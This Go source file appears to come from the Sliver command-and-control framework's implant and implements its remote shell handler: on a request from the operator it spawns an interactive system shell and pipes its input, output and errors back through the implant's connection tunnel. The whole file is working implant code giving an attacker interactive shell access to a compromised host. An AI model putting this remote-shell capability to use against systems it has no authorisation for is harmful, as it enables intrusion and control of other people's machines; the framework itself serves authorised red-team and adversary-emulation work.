package tunnel_handlers

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"io"

	"github.com/bishopfox/sliver/implant/sliver/shell"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	shellReq := &sliverpb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
		// {{end}}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	systemShell, err := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	if systemShell == nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to get system shell")
		// {{end}}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, shellResp)
		return
	}

	// At this point, comand is already started by StartInteractive
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to spawn! err: %v", err)
		// {{end}}
		shellResp, _ := proto.Marshal(&sliverpb.Shell{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, shellResp)
		return
	} else {
		// {{if .Config.Debug}}
		log.Printf("[shell] Process spawned!")
		// {{end}}
	}

	tunnel := transports.NewTunnel(
		shellReq.TunnelID,
		systemShell.Stdout,
		systemShell.Stdin,
	)
	connection.AddTunnel(tunnel)

	shellResp, _ := proto.Marshal(&sliverpb.Shell{
		Pid:      uint32(systemShell.Command.Process.Pid),
		Path:     shellReq.Path,
		TunnelID: shellReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}

	// Cleanup function with arguments
	cleanup := func(reason string, err error) {
		// {{if .Config.Debug}}
		log.Printf("[shell] Closing tunnel request %d (%s). Err: %v", tunnel.ID, reason, err)
		// {{end}}

		systemShell.Stop()

		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	// Handle stderr
	// Ideally we'd want the tunnel interface to use a slice of io.Readers and iterate over them.
	// Not sure how that would work with the sequencing stuff in data_handler.go
	go func() {
		tWriter := tunnelWriter{
			conn: connection,
			tun:  tunnel,
		}
		_, err := io.Copy(tWriter, systemShell.Stderr)

		if err != nil {
			cleanup("io error", err)
			return
		}
		if systemShell.Command.ProcessState != nil {
			if systemShell.Command.ProcessState.Exited() {
				cleanup("process terminated", nil)
				return
			}
		}
		if err == io.EOF {
			cleanup("EOF", err)
			return
		}
	}()

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: connection,
		}
		_, err := io.Copy(tWriter, tunnel.Reader)

		if err != nil {
			cleanup("io error", err)
			return
		}

		err = systemShell.Wait() // sync wait, since we already locked in io.Copy, and it will release once it's done
		if err != nil {
			cleanup("shell wait error", err)
			return
		}

		if systemShell.Command.ProcessState != nil {
			if systemShell.Command.ProcessState.Exited() {
				cleanup("process terminated", nil)
				return
			}
		}
		if err == io.EOF {
			cleanup("EOF", err)
			return
		}
	}()

	// {{if .Config.Debug}}
	log.Printf("[shell] Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}
